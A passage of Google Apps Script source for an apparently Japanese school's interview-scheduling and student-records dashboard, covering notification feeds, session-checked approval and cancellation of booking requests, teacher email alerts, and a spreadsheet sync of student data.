  for (let i = 1; i < data.length; i++) {
    if (String(data[i][5]).trim() === "Reassign_Pending"
        && String(data[i][12]).trim() === me) {
      // The slot the request currently sits on is the requesting teacher's slot.
      out.push({
        type: "reassign",
        slotTeacherId: data[i][1],      // requesting teacher's id (column the slot is on)
        fromTeacherName: data[i][2],     // requesting teacher's name
        student: data[i][6] || "",
        date: data[i][3],
        period: data[i][4],
        newDate: data[i][14] || "",      // proposed new date (if any)
        newPeriod: data[i][15] || "",
        reason: data[i][21] || ""        // Reassign_Reason (col 22 / idx 21)
      });
    }
  }
  return out;
}
// Unified notification feed for the bell: pending date-change requests AND
// pending cancellation requests, restricted to bookings where this user is the
// 担当 (In Charge). Each item carries the slot's teacherId/date/period so the
// frontend can jump straight to that slot in the all-teachers calendar.
function getPendingNotifications(staffName) {
  _requireSession_("getPendingNotifications");
  const data = _readTabs_(["Schedule_DB"])["Schedule_DB"] || [];
  const me = _normName_(staffName);
  let out = [];
  for (let i = 1; i < data.length; i++) {
    let inCharge = _normName_(data[i][11]);
    if (inCharge === "" || inCharge !== me) continue;

    // Date-change request: BookerReq_Status (col 20 / idx 19) === "Pending"
    if (String(data[i][19]).trim() === "Pending") {
      out.push({
        type: "datechange",
        // 1-based Schedule_DB row. The 承認 / 予約を取り消す buttons act on this row
        // directly, so it has to travel with the item — without it the handlers
        // were called with `undefined` and the whole flow was dead.
        // ⚠️ Positional handle: the row can move between this read and the click,
        // so the acting endpoints re-verify student/date/period before writing.
        rowIndex: i + 1,
        teacherId: data[i][1],
        teacherName: data[i][2],
        student: data[i][6] || "",
        date: data[i][3],
        period: data[i][4],
        newDate: data[i][16],
        newPeriod: data[i][17],
        reason: data[i][18] || ""
      });
    }

    // Cancellation request: Status (col 6 / idx 5) === "Cancel_Request"
    if (String(data[i][5]).trim() === "Cancel_Request") {
      out.push({
        type: "cancel",
        teacherId: data[i][1],
        teacherName: data[i][2],
        student: data[i][6] || "",
        date: data[i][3],
        period: data[i][4],
        reason: data[i][22] || ""  // Cancel_Reason (col 23 / idx 22)
      });
    }
  }
  return out;
}

// Upcoming interviews for the ホーム やること panel.
//
// NOT in the boot payload, deliberately — Schedule_DB is a separate read and boot
// is the critical path for every user on every load (1178ms across four calls
// was cut to 327ms in one). The home screen fetches this after paint instead, so
// the page appears immediately and this fills in.
const HOME_UPCOMING_DAYS = 7;

function getUpcomingForUser(role, perms, userId, userName) {
  // Identity comes from the SESSION. role/userId/userName are still in the
  // signature for consistency with every other endpoint, and are used only as
  // the observe-mode fallback — _requireSession_ returns null when AUTH_ENFORCE
  // is off and throws when it is on.
  const sess = _requireSession_("getUpcomingForUser");
  const me = sess || { role: role, id: userId, name: userName };
  const myRole = String(me.role || "");

  // Admins and master see requests only, by decision — an all-interviews list
  // would be a schedule, and 面接スケジュール already does that better. So they
  // are excluded FIRST: _hasPerm_ below returns true for master unconditionally,
  // and the admin default set includes view_admissions.
  if (_isAdminRole_(role) || myRole === "master" || myRole === "admin") return [];
  // Otherwise: a teacher's slots are keyed by ID, everyone else's by their 担当
  // name (see `mine` below). A custom role is staff, so it takes the 担当 path —
  // which is why this asks for the permission rather than naming 営業.
  if (myRole !== "teacher" && !_hasPerm_(role, perms, "view_admissions")) return [];

  // Date strings, never Date objects: Schedule_DB stores YYYY-MM-DD and
  // `new Date("YYYY-MM-DD")` parses as UTC, which shifts the day in Asia/Tokyo.
  // String compare is correct for this format and has no timezone to get wrong.
  const today = Utilities.formatDate(new Date(), "Asia/Tokyo", "yyyy-MM-dd");
  const end = new Date();
  end.setDate(end.getDate() + HOME_UPCOMING_DAYS);
  const cutoff = Utilities.formatDate(end, "Asia/Tokyo", "yyyy-MM-dd");

  const data = _readTabs_(["Schedule_DB"])["Schedule_DB"] || [];
  const meName = _normName_(me.name);
  const meId = String(me.id || "").trim();
  let out = [];

  for (let i = 1; i < data.length; i++) {
    if (String(data[i][5]).trim() !== "Booked") continue;
    const date = String(data[i][3] || "").trim();
    if (date < today || date > cutoff) continue;

    // A teacher's own slots are keyed by ID; a 営業's bookings by the 担当 name.
    // ⚠️ 担当 matching is by name, so a value that matches no staff member
    // reaches nobody — diagnoseInChargeMatching reports exactly that.
    const mine = (myRole === "teacher")
      ? String(data[i][1] || "").trim() === meId
      : _normName_(data[i][11]) === meName && meName !== "";
    if (!mine) continue;

    out.push({
      type: "interview",
      date: date,
      period: String(data[i][4] || ""),
      student: String(data[i][6] || ""),
      nationality: String(data[i][7] || ""),
      course: String(data[i][10] || ""),
      teacherName: String(data[i][2] || ""),
      link: String(data[i][8] || "")
    });
  }

  out.sort(function (a, b) {
    if (a.date !== b.date) return a.date < b.date ? -1 : 1;
    return String(a.period).localeCompare(String(b.period), "ja");
  });
  return out;
}

// Both 承認 and 予約を取り消す act on a Schedule_DB row index that was handed to the
// browser when the bell was populated, and rows move. The status and 担当 checks
// catch most drift on their own, but a deleted row that shifts a DIFFERENT pending
// request into the same index would pass both — so the client sends back the
// student/date/period it actually displayed and this confirms the row is still the
// one the user was looking at.
//
// ⚠️ Reads with getDisplayValues(), not getValues(). getPendingNotifications feeds
// the browser through _readTabs_, which returns strings; getValues() would hand back
// a Date for the date column and every comparison would mismatch.
//
// The 担当 identity comes from the SESSION, not the staffName argument. That
// argument is client-supplied and was the only thing standing between a caller and
// somebody else's booking.
function _requirePendingDateChangeRow_(sSheet, rowIndex, staffName, student, date, period) {
  const me = _requireSession_("dateChangeAction");
  const actor = (me && me.name) ? me.name : staffName;
  const width = sSheet.getLastColumn();
  const row = sSheet.getRange(rowIndex, 1, 1, width).getDisplayValues()[0];

  if (String(row[19]).trim() !== "Pending") throw new Error("このリクエストは既に処理されています。");
  if (_normName_(row[11]) !== _normName_(actor)) throw new Error("権限がありません。");

  // Confirmation fields are optional so a stale browser tab still works; when they
  // are sent they have to match.
  const differs = function (a, b) { return String(a || "").trim() !== String(b || "").trim(); };
  if ((student !== undefined && differs(row[6], student)) ||
      (date    !== undefined && differs(row[3], date)) ||
      (period  !== undefined && differs(row[4], period))) {
    throw new Error("この予約は変更されています。画面を更新してからやり直してください。");
  }
  return { row: row, actor: actor };
}

// 承認: move the booking to the requested slot. student/date/period are the values
// the bell displayed and are verified against the row before anything is written.
function approveBookerDateChange(staffName, rowIndex, student, date, period) {
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  const sSheet = ss.getSheetByName("Schedule_DB");
  if (!sSheet) throw new Error("面接スケジュールのデータが見つかりません。（SYS-01）");
  rowIndex = parseInt(rowIndex);
  const chk = _requirePendingDateChangeRow_(sSheet, rowIndex, staffName, student, date, period);
  const row = chk.row;
  const newDate = String(row[16] || "").trim(), newPeriod = String(row[17] || "").trim();
  if (!newDate || !newPeriod) throw new Error("新しい日時が不正です。");
  // The request may have been raised before this time started; approving now would
  // move the interview into the past. 予約を取り消す or 却下 are still available.
  if (_slotIsPast_(newDate, newPeriod)) {
    throw new Error("希望の日時はすでに過ぎているため承認できません。取り消すか却下してください。");
  }
  sSheet.getRange(rowIndex, 4).setValue(newDate);
  sSheet.getRange(rowIndex, 5).setValue(newPeriod);
  // Clears the request block, including the Pending flag in col 20 the bell reads.
  sSheet.getRange(rowIndex, 17, 1, 5).setValues([["", "", "", "", ""]]);
  sSheet.getRange(rowIndex, 1).setValue(new Date());
  _notifyTeacherDateChangeResult_(row, newDate, newPeriod, true);
  _logActivity_({ name: chk.actor, role: "sales" }, "日時変更リクエスト承認", row[2], newDate + " " + newPeriod);
  return "Success";
}

// 予約を取り消す: the request is not merely declined — the interview itself is
// cancelled and the slot goes back to 空き.
//
// Distinct from rejectBookerDateChange, which only clears the request and leaves the
// booking standing at its original time.
//
// ⚠️ Clearing cols 17-21 is NOT optional. Col 20 (idx 19) is the Pending flag
// getPendingNotifications keys on; free the slot without clearing it and the
// notification points at an empty slot forever.
function cancelBookingFromDateChange(staffName, rowIndex, student, date, period) {
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  const sSheet = ss.getSheetByName("Schedule_DB");
  if (!sSheet) throw new Error("面接スケジュールのデータが見つかりません。（SYS-01）");
  rowIndex = parseInt(rowIndex);
  const chk = _requirePendingDateChangeRow_(sSheet, rowIndex, staffName, student, date, period);
  const row = chk.row;
  const wasDate = String(row[3] || "").trim(), wasPeriod = String(row[4] || "").trim();

  // Cols 6-12 are contiguous: Status, Student, Nationality, Meeting Link,
  // Document URL, Course, In Charge. Same field set clearBooking() frees a slot
  // with, in one write. Intake (col 24) and Remarks (col 25) are left alone,
  // matching clearBooking rather than inventing a difference here.
  // ⚠️ The booking as it was, for 操作履歴 — this is a delete in all but name (the student,
  // course and 担当 are gone the moment it writes), and it takes no sheet copy any more.
  const gone = _sheetRowForLog_(sSheet, rowIndex);
  sSheet.getRange(rowIndex, 6, 1, 7).setValues([["Available", "", "", "", "", "", ""]]);
  sSheet.getRange(rowIndex, 17, 1, 5).setValues([["", "", "", "", ""]]);
  sSheet.getRange(rowIndex, 1).setValue(new Date());

  _notifyTeacherBookingCancelled_(row, wasDate, wasPeriod);
  _logActivity_({ name: chk.actor, role: "sales" }, "予約を取り消し", row[2],
                wasDate + " " + wasPeriod + " / " + String(row[6] || "") + (gone ? " / 取消前: " + gone : ""));
  return "Success";
}

// 取り下げ: the REQUESTER takes their own request back, whichever kind it is.
//
// This is what makes "one active request per booking" (see _activeRequest_) a rule
// rather than a dead end. Every request now blocks the other two, so every request
// has to be retractable by the person who raised it — otherwise a teacher who asks
// for a 日時変更 and then learns the student withdrew would be stuck waiting for the
// 担当 to decide something that no longer matters, unable to send the cancellation.
//
// ⚠️ It CLEARS ALL THREE MARKERS, not just the one it reports. Rows written before
// the rule existed can carry two at once (a 日時変更 was possible on top of a 交代),
// and healing only the reported one would leave the booking still blocked with an
// empty banner — nothing on screen to explain why the buttons stay disabled.
//
// ⚠️ Ownership is the booking's TEACHER, resolved from the SESSION — not the
// staffName-style argument the 担当-side actions take, and not the 担当 (who already
// has 承認/却下 in the bell). Without this check any caller could withdraw anybody's
// request.
//
// ⚠️ No teacher notification, unlike rejectBookerDateChange: there the 担当 decided
// and the teacher needs telling. Here the teacher IS the actor.
function withdrawActiveRequest(teacherId, date, period, actorName, actorId) {
  const me = _requireSession_("withdrawActiveRequest");
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  const sSheet = ss.getSheetByName("Schedule_DB");
  if (!sSheet) throw new Error("面接スケジュールのデータが見つかりません。（SYS-01）");

  const found = _findScheduleRow_(sSheet, teacherId, date, period);
  if (!found) throw new Error("対象の予約が見つかりません。");
  const row = found.row;

  const active = _activeRequest_(row);
  if (!active) throw new Error("取り下げるリクエストがありません。");

  const mine = me && String(me.id || "").trim() === String(row[1] || "").trim();
  if (!mine && !_isAdminLevel_(me ? me.role : "")) {
    throw new Error("権限がありません。");
  }

  // Detail for the log, read before anything is overwritten.
  let detail = "";
  if (active.kind === "datechange") {
    detail = "希望していた日時: " + String(row[16] || "").trim() + " " + String(row[17] || "").trim();
  } else if (active.kind === "reassign") {
    detail = "依頼先: " + String(row[13] || "").trim();
  } else {
    detail = "理由: " + String(row[22] || "").trim();
  }

  // 日時変更 (cols 17-21) — contiguous, one write, same span requestBookerDateChange
  // fills. 交代 (cols 13-16) and its reason (col 22) are NOT contiguous with it.
  sSheet.getRange(found.rowIndex, 17, 1, 5).setValues([["", "", "", "", ""]]);
  sSheet.getRange(found.rowIndex, 13, 1, 4).setValues([["", "", "", ""]]);
  sSheet.getRange(found.rowIndex, 22, 1, 2).setValues([["", ""]]);  // Reassign_Reason, Cancel_Reason
  // ⚠️ Only a request status is rolled back. A row can reach here with 日時変更
  // pending while Status is legitimately "Booked"; writing "Booked" unconditionally
  // would be harmless there but would also overwrite anything else the status ever
  // holds, so the two request statuses are named explicitly.
  const st = String(row[5] || "").trim();
  if (st === "Reassign_Pending" || st === "Cancel_Request") {
    sSheet.getRange(found.rowIndex, 6).setValue("Booked");
  }
  sSheet.getRange(found.rowIndex, 1).setValue(new Date());

  _logActivity_({ name: (me && me.name) || actorName || "", id: (me && me.id) || actorId || "",
                 role: (me && me.role) || "teacher" },
               active.label + "リクエストを取り下げ", date + " " + period, detail);
  return "Success";
}

// 却下: decline the move and leave the booking standing at its original time.
//
// ⚠️ No UI reaches this any more — the bell offers 承認 / 予約を取り消す. It is kept
// deliberately (declining without destroying the interview is a reasonable third
// action) and stays registered, so it keeps the same session-bound guard as the two
// live actions rather than trusting the staffName argument it is handed.
function rejectBookerDateChange(staffName, rowIndex, student, date, period) {
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  const sSheet = ss.getSheetByName("Schedule_DB");
  if (!sSheet) throw new Error("面接スケジュールのデータが見つかりません。（SYS-01）");
  rowIndex = parseInt(rowIndex);
  const chk = _requirePendingDateChangeRow_(sSheet, rowIndex, staffName, student, date, period);
  const row = chk.row;
  const reqDate = String(row[16] || "").trim(), reqPeriod = String(row[17] || "").trim();
  sSheet.getRange(rowIndex, 17, 1, 5).setValues([["", "", "", "", ""]]);
  _notifyTeacherDateChangeResult_(row, reqDate, reqPeriod, false);
  _logActivity_({ name: chk.actor, role: "sales" }, "日時変更リクエスト却下", row[2], reqDate + " " + reqPeriod);
  return "Success";
}

// The teacher asked to MOVE an interview and the 担当 cancelled it outright, so the
// 却下 wording from _notifyTeacherDateChangeResult_ would be actively misleading —
// "your request was not approved" reads as "the interview stands", which is the
// opposite of what happened.
function _notifyTeacherBookingCancelled_(row, wasDate, wasPeriod) {
  try {
    const teacherId = row[1];
    const tSheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName("Teacher_Master");
    if (!tSheet) return;
    const td = tSheet.getDataRange().getValues();
    for (let i = 1; i < td.length; i++) {
      if (String(td[i][0]).trim() === String(teacherId).trim()) {
        const email = String(td[i][3] || "").trim();
        const notifOn = String(td[i][4]).trim() !== "OFF";
        if (email && notifOn) {
          const subject = `【面接取消】${wasDate} ${wasPeriod} の面接は取り消されました`;
          let body = `${td[i][1]} 先生\n\n`;
          body += `${wasDate} ${wasPeriod} の面接は取り消されました。日時変更ではなく、面接自体がなくなります。\n`;
          body += `この枠は空きに戻っています。\n`;
          try { GmailApp.sendEmail(email, subject, body, _mailOptions_()); } catch(e) {}
        }
        break;
      }
    }
  } catch (e) {}
}

function _notifyTeacherDateChangeResult_(row, newDate, newPeriod, approved) {
  try {
    const teacherId = row[1];
    const tSheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName("Teacher_Master");
    if (!tSheet) return;
    const td = tSheet.getDataRange().getValues();
    for (let i = 1; i < td.length; i++) {
      if (String(td[i][0]).trim() === String(teacherId).trim()) {
        let email = String(td[i][3] || "").trim();
        let notifOn = String(td[i][4]).trim() !== "OFF";
        if (email && notifOn) {
          let subject = approved ? `【日時変更 承認】${newDate} ${newPeriod} に変更されました` : `【日時変更 却下】リクエストは承認されませんでした`;
          let body = `${td[i][1]} 先生\n\n`;
          body += approved ? `面接日時の変更リクエストが承認され、${newDate} ${newPeriod} に変更されました。\n` : `面接日時の変更リクエストは承認されませんでした。元の日時のままです。\n`;
          try { GmailApp.sendEmail(email, subject, body, _mailOptions_()); } catch(e) {}
        }
        break;
      }
    }
  } catch (e) {}
}

function _sendEmailNotif_(teacherId, date, period, studentName, inCharge, action) {
  try {
    const sheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName("Teacher_Master");
    const data = sheet.getDataRange().getValues();
    let email = "";
    let notifOn = true;
    let tName = "";
    
    for(let i=1; i<data.length; i++) {
      if(String(data[i][0]).trim() === String(teacherId)) {
        tName = data[i][1];
        email = String(data[i][3] || "").trim();
        notifOn = String(data[i][4]).trim() !== "OFF";
        break;
      }
    }
    
    if (email === "" || !notifOn) return; 
    
    let subject = action === "booked" ? `【面接予約】新規予約が入りました (${date})` : `【面接キャンセル】予約がキャンセルされました (${date})`;
    let body = `${tName} 先生\n\n`;
    body += action === "booked" ? `以下の日時に新しい面接が予約されました。\n\n` : `以下の面接予約がキャンセルされました。\n\n`;
    body += `日付: ${date}\n時間: ${period}\n学生: ${studentName}\n担当: ${inCharge || '未設定'}\n\n`;
    body += `ダッシュボードから詳細をご確認ください。\n`;
    
    GmailApp.sendEmail(email, subject, body, _mailOptions_());
  } catch(e) { console.error("Email Error: " + e.message); }
}

function _sendAdminCancelEmail_(teacherName, date, period, studentName, reason, inCharge) {
  const sheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName("Staff_Master");
  if (!sheet) return;
  const data = sheet.getDataRange().getValues();

  const target = _normName_(inCharge);
  let toEmail = "";

  // Find the 担当 (In Charge) staff member's email by normalized name match.
  if (target !== "") {
    for (let i = 1; i < data.length; i++) {
      let sName = _normName_(data[i][1]);
      let sEmail = String(data[i][3] || "").trim();
      let notifOn = String(data[i][4]).trim() !== "OFF";
      if (sName === target && sEmail !== "" && notifOn) {
        toEmail = sEmail;
        break;
      }
    }
  }

  // Fallback: if the 担当 can't be resolved to a staff email (e.g. blank or a
  // name mismatch), notify all admins so the request is never silently lost.
  let isFallback = false;
  if (toEmail === "") {
    let adminEmails = [];
    for (let i = 1; i < data.length; i++) {
      let sEmail = String(data[i][3] || "").trim();
      let sPerms = String(data[i][5] || "");
      let notifOn = String(data[i][4]).trim() !== "OFF";
      // treat users with manage_users (admins) as the safety net
      if (sEmail !== "" && notifOn && sPerms.indexOf("manage_users") !== -1) {
        adminEmails.push(sEmail);
      }
    }
    if (adminEmails.length === 0) return;
    toEmail = adminEmails.join(",");
    isFallback = true;
  }

  let subject = `【キャンセル依頼】${teacherName}先生から面接キャンセルの依頼があります`;
  let greeting = isFallback ? '管理者様' : ((String(inCharge || '').trim() || '担当') + 'さん');
  let body = `${greeting}\n\n${teacherName}先生から以下の面接についてキャンセル（日程変更）の依頼がありました。\n\n`;
  body += `日付: ${date}\n時間: ${period}\n学生: ${studentName}\n担当: ${target || '未設定'}\n`;
  if (reason && String(reason).trim()) body += `理由: ${reason}\n`;
  body += `\nダッシュボードから確認し、学生への連絡と予約の取り消しを行ってください。\n`;

  try {
    GmailApp.sendEmail(toEmail, subject, body, _mailOptions_());
  } catch(e) { console.error("Admin Email Error: " + e.message); }
}

// ⚠️ WHOSE row comes from the SESSION, never from the arguments. It took userId and userRole
// from the browser with only "some session exists" as the guard, so any signed-in user could
// switch any colleague's email notifications. Both callers (アカウント設定, the calendar's
// toggleNotif) only ever mean "my own", so the signature stays and the arguments are ignored
// whenever a session resolved; observe mode with no session still reads them, as every guard does.
function toggleNotification(userId, userRole, turnOn) {
  const me = _requireSession_("toggleNotification");
  if (me) { userId = me.id; userRole = me.role; }
  if (_isMasterRole_(userRole)) throw new Error("マスターアカウントにはメール通知の設定がありません。");
  const sheetName = userRole === "teacher" ? "Teacher_Master" : "Staff_Master";
  const sheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName(sheetName);
  const data = sheet.getDataRange().getValues();
  for(let i = 1; i < data.length; i++) {
    if(String(data[i][0]).trim() === String(userId)) {
      sheet.getRange(i + 1, 5).setValue(turnOn ? "ON" : "OFF");
      return turnOn;
    }
  }
  throw new Error("ユーザーが見つかりません。");
}

// --- 2. AUTOMATED STUDENT DATA SYNC ---
function fetchAndMergeStudentData(userRole, perms) {
  _bustStudentCache_();   // fresh import must not be masked by a stale cache entry
  if (!_permOrLegacyRole_(userRole, perms, "view_students", ["sales"])) throw new Error("権限がありません");
  // ⚠️ Resolved FIRST. Inside the per-tab loop a missing property would only be
  // recorded as a per-tab error and the import would carry on without its source.
  const sourceId = _requireConfig_(CONFIG_STUDENT_SOURCE);
  
  const ssLocal = SpreadsheetApp.getActiveSpreadsheet();
  let sheetCentral = ssLocal.getSheetByName("Central_DB");
  let sheetPast = ssLocal.getSheetByName("Past_DB");
  
  if (!sheetCentral) sheetCentral = ssLocal.insertSheet("Central_DB");
  if (!sheetPast) sheetPast = ssLocal.insertSheet("Past_DB");
  
  const today = new Date();
  today.setHours(0,0,0,0); 

  const targets = {
    central: {
      sheet: sheetCentral,
      isPast: false,
      cols: [
        "学籍番号", "ニックネーム", "国名", "名前英語", "読み方", "クラス", 
        "担任", "国担当", "電話番号", "メールアドレス", "寮", 
        "アルバイト1", "アルバイト１連絡先", "アルバイト２", "アルバイト２連絡先", 
        "生年月日", "年齢", "性別", "入国日", "始業日", 
        "卒業予定", "在留期限", "学歴", "コース", "ビザの種類", "JLPT", "決定進路"
      ],
      records: {}
    },
    past: {
      sheet: sheetPast,
      isPast: true,
      cols: [
        "学籍番号", "ニックネーム", "国籍", "名前英語", "読み方", "クラス", 
        "担任", "国担当", "電話番号", "メールアドレス", "寮", 
        "生年月日", "年齢", "性別", "入国日", "始業日", 
        "卒業予定", "在留期限", "学歴", "コース", "ビザの種類", "JLPT", "決定進路",
        // Appended, never inserted: Past_DB readers locate columns by header name,
        // but anything that did drift to positional would break silently.
        // 業種 is a ready-made employment breakdown; 都道府県 is where they went.
        "都道府県", "業種",
        // NOT a source column — filled from the source TAB NAME below. The tabs
        // (修了2024.3まで, 修了2024.4~2025.3, …) already ARE the graduation
        // cohorts, so this avoids parsing 卒業予定, which is 1381/1400 blank and
        // comes back as "############" through the bulk reader anyway.
        "修了期"
      ],
      records: {}
    }
  };

  const syncConfigs = [
    { sourceId: sourceId, sourceTab: "在籍", targetGroup: "central" },
    { sourceId: sourceId, sourceTab: "修了2024.3まで", targetGroup: "past" },
    { sourceId: sourceId, sourceTab: "修了2024.4~2025.3", targetGroup: "past" },
    { sourceId: sourceId, sourceTab: "修了2025.4~2026.3", targetGroup: "past" },
    { sourceId: sourceId, sourceTab: "修了2026.4~",       targetGroup: "past" }
    // Add more here! Example:
    // { sourceId: sourceId, sourceTab: "退学者", targetGroup: "past" }
  ];
  
  let syncErrors = [];

  syncConfigs.forEach(config => {
    try {
      const targetGroup = targets[config.targetGroup];
      const sourceSS = SpreadsheetApp.openById(config.sourceId);
      
      let sourceSheet = null;
      const allTabs = sourceSS.getSheets();
      for (let s of allTabs) {
        if (s.getName().replace(/[\s　]/g, '') === config.sourceTab.replace(/[\s　]/g, '')) {
          sourceSheet = s;
          break;
        }
      }
      
      if (!sourceSheet) throw new Error(`タブが見つかりません: ${config.sourceTab}`);
      
      const rawData = sourceSheet.getDataRange().getValues();
      
      let headerRowIndex = -1;
      for (let i = 0; i < Math.min(100, rawData.length); i++) {
        if (rawData[i].some(cell => String(cell).replace(/[\s　]/g, '') === "学籍番号")) { 
          headerRowIndex = i; 
          break; 
        }
      }
      
      if (headerRowIndex === -1) throw new Error(`'学籍番号' ヘッダーが見つかりません。`);
      
      const headerRow = rawData[headerRowIndex];
      
      const columnMap = targetGroup.cols.map(colName => {
        let target = String(colName).replace(/[１-９]/g, s => String.fromCharCode(s.charCodeAt(0) - 0xFEE0)).replace(/[\s　]/g, ''); 
        
        for (let c = 0; c < headerRow.length; c++) {
          let rawCellText = String(headerRow[c]);
          let cellText = rawCellText.replace(/[１-９]/g, s => String.fromCharCode(s.charCodeAt(0) - 0xFEE0)).replace(/[\s　]/g, '');
          if (cellText === "") continue;
          
          // ⚠️ 進路希望１/２/３ sit to the LEFT of 決定進路 in every 修了 tab, and a
          // loose "contains 進路" test matched those first — so for years the sync
          // imported the student's ASPIRATION column (1 non-empty value across
          // 686 rows) while the real 決定進路 was never read at all. Skip the
          // 希望 columns outright before any other test can claim them.
          if (colName === "決定進路" && cellText.indexOf("希望") !== -1) continue;

          if (cellText === target) return c;
          if (cellText.includes(target)) {
            if (!target.includes("連絡先") && cellText.includes("連絡先")) continue;
            return c;
          }
          // Deliberately NOT a bare "進路" test — that is what matched 進路希望１.
          // The real header is 決定\n進路（…） or 決定\n進路【…】入力; whitespace is
          // already stripped from cellText, so 決定進路 matches both shapes.
          if (colName === "決定進路" && cellText.indexOf("決定進路") !== -1) return c;
          if ((colName === "国籍" || colName === "国名") && (rawCellText.includes("国籍") || rawCellText.includes("国名"))) return c;
        }
        return -1; 
      });
      
      // "修了2024.4~2025.3" -> "2024.4~2025.3". The prefix carries no information
      // once the column is named 修了期.
      const cohortLabel = String(config.sourceTab).replace(/^修了/, "").trim();
      const cohortIndex = targetGroup.cols.indexOf("修了期");

      for (let i = headerRowIndex + 1; i < rawData.length; i++) {
        const row = rawData[i];
        const studentId = row[columnMap[0]]; 
        if (!studentId) continue; 
        
        if (!targetGroup.records[studentId]) {
          let arrLen = targetGroup.isPast ? targetGroup.cols.length : targetGroup.cols.length + 1;
          targetGroup.records[studentId] = new Array(arrLen).fill("");
          targetGroup.records[studentId][0] = studentId; 
        }
        columnMap.forEach((colIndex, finalIndex) => {
          if (colIndex !== -1 && row[colIndex] !== "" && row[colIndex] != null) {
            targetGroup.records[studentId][finalIndex] = row[colIndex];
          }
        });

        // The cohort, from the tab this row was read out of. Written after the
        // column pass so a later tab re-stating the same student overwrites it
        // with the newer cohort rather than leaving the first one that won.
        if (targetGroup.isPast && cohortIndex !== -1) {
          targetGroup.records[studentId][cohortIndex] = cohortLabel;
        }
      }
    } catch (e) {
      syncErrors.push(`[${config.sourceTab}] ${e.message}`);
    }
  });

  for (const groupKey in targets) {
    const tg = targets[groupKey];
    if (!tg.isPast) {
      const visaDateIndex = tg.cols.indexOf("在留期限");
      for (const id in tg.records) {
        let visaDateVal = tg.records[id][visaDateIndex];
        let alertText = "OK"; 
        if (visaDateVal) {
          let vDate = new Date(visaDateVal);
          if (!isNaN(vDate.getTime())) {
            let diffTime = vDate - today;
            let diffDays = Math.ceil(diffTime / (1000 * 60 * 60 * 24));
            if (diffDays < 0) alertText = "期限切れ";
            else if (diffDays <= 60) alertText = `${diffDays} 日`;
          }
        } else { alertText = "データなし"; }
        tg.records[id][tg.cols.length] = alertText; 
      }
    }
    
    let finalHeaders = [...tg.cols];
    if (!tg.isPast) finalHeaders.push("ビザ警告");

    let finalData = [finalHeaders];
    for (const id in tg.records) {
      finalData.push(tg.records[id]);
    }
    
    tg.sheet.clearContents();
    if (finalData.length > 1) {
      tg.sheet.getRange(1, 1, finalData.length, finalData[0].length).setValues(finalData);
    }
  }

  if (syncErrors.length > 0) console.error("同期エラー: " + syncErrors.join(" | "));

  // Both sheets were just rewritten above, so the per-execution read memo holds
  // pre-sync snapshots. Drop them or the caller gets back the old data.
  _forgetTab_("Central_DB");
  _forgetTab_("Past_DB");
  return getDashboardData("admin", true);
}

// --- 3. DASHBOARD READ FUNCTIONS ---
// `includePast` defaults to FALSE. Past_DB is ~1400 rows and measured as two
// thirds of this call's 408KB payload, but 修了・卒業生 is not the default
// sub-tab — most logins never look at it. Boot omits it; the sub-tab asks for
// it on first visit. fetchAndMergeStudentData passes true because it has just
// rewritten both sheets and the caller expects both back.
function getDashboardData(userRole, includePast, perms) {
  if (!_permOrLegacyRole_(userRole, perms, "view_students", ["sales", "teacher"])) throw new Error("権限がありません");

  const want = includePast ? ["Central_DB", "Past_DB"] : ["Central_DB"];
  const tabs = _readTabs_(want);

  // _readTabs_ yields [] for a tab that does not exist, which is indistinguishable
  // from an empty one — so check existence explicitly to keep the original error.
  if (!tabs["Central_DB"] || !tabs["Central_DB"].length) {
    if (!SpreadsheetApp.getActiveSpreadsheet().getSheetByName("Central_DB")) {
      throw new Error("学生データが見つかりません。（SYS-02）");
    }
  }

  return {
    current: tabs["Central_DB"] || [],
    past: includePast ? (tabs["Past_DB"] || []) : []
  };
}

function getLiveReportData(userRole, perms) {
  // Permission check stays in the wrapper — the cached producer runs without
  // caller context, and a cached result must never bypass authorisation.
  if (!_permOrLegacyRole_(userRole, perms, "view_students", ["sales"])) throw new Error("権限がありません");
  return _cached_('liveReport', CACHE_TTL_SHORT, _liveReportDataUncached_);
}

function _liveReportDataUncached_() {
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  const dbSheet = ss.getSheetByName("Central_DB");
  
  if (!dbSheet) return { mainTable: [], summaryTable: [], totalCountries: 0 };
  
  const rawData = dbSheet.getDataRange().getDisplayValues();
  if (rawData.length < 2) return { mainTable: [], summaryTable: [], totalCountries: 0 };

  const headers = rawData[0];
  const idIdx = headers.indexOf("学籍番号");
  const countryIdx = headers.indexOf("国名");
  const courseIdx = headers.indexOf("コース");
  const visaIdx = headers.indexOf("ビザの種類");

  let countryStats = {}; 
  let pivotColumns = new Set();
  let totalStudents = 0;

  let courseVisaStats = {}; 
  let allVisaTypes = new Set();

  for (let i = 1; i < rawData.length; i++) {
    const row = rawData[i];
    const studentId = String(row[idIdx]).trim();
    const country = row[countryIdx];
    const course = row[courseIdx];
    let visa = row[visaIdx];

    if (!studentId || !country) continue;

    const intakeYear = studentId.substring(0, 4) + "年";
    const intakeMonth = parseInt(studentId.substring(4, 6), 10) + "月";
    if (visa !== "留学") visa = "その他";
    
    allVisaTypes.add(visa);

    let cleanCourse = course.substring(course.indexOf('_') + 1).trim();
    cleanCourse = cleanCourse.replace(/[（\(]一般[）\)]/g, "").replace(/\d+期/g, "").trim(); 
    cleanCourse = _normalizeCourseKana_(cleanCourse);

    if (cleanCourse === "日本語・文化2年課程") cleanCourse = "文化";
    else if (cleanCourse === "就職2年課程") cleanCourse = "就職";
    else if (cleanCourse.startsWith("進学") && cleanCourse.endsWith("課程")) cleanCourse = cleanCourse.replace("課程", ""); 

    const pivotKey = `${intakeYear} ${intakeMonth} ${visa}\n${cleanCourse}`;
    pivotColumns.add(pivotKey);

    if (!countryStats[country]) countryStats[country] = { total: 0, pivotData: {} };
    countryStats[country].total += 1;
    countryStats[country].pivotData[pivotKey] = (countryStats[country].pivotData[pivotKey] || 0) + 1;
    totalStudents += 1;

    if (!courseVisaStats[cleanCourse]) courseVisaStats[cleanCourse] = { total: 0 };
    courseVisaStats[cleanCourse][visa] = (courseVisaStats[cleanCourse][visa] || 0) + 1;
    courseVisaStats[cleanCourse].total += 1;
  }

